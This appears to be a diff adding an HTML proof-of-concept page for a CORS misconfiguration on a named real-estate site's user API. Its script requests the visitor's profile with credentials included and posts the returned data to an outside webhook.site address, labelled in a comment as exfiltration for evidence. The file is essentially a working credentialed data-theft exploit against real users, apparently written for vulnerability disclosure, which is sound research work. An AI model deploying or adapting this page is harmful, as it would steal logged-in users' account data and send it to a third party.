@@ -1,0 +1,33 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Zimmo CORS PoC</title>
+  </head>
+  <body>
+    <h3>Zimmo.be CORS Misconfiguration PoC</h3>
+    <pre id="output">Running request...</pre>
+
+    <script>
+      fetch("https://user-api.zimmo.be/users/me", {
+        method: "GET",
+        credentials: "include",
+      })
+        .then(function (res) {
+          return res.text();
+        })
+        .then(function (data) {
+          document.getElementById("output").innerText = data;
+          // exfil to webhook for PoC evidence
+          fetch("https://webhook.site/41e326b8-ca14-4950-a11e-2dd349390ce7", {
+            method: "POST",
+            headers: { "Content-Type": "text/plain" },
+            body: data,
+          });
+        })
+        .catch(function (err) {
+          document.getElementById("output").innerText = "Error: " + err;
+        });
+    </script>
+  </body>
+</html>
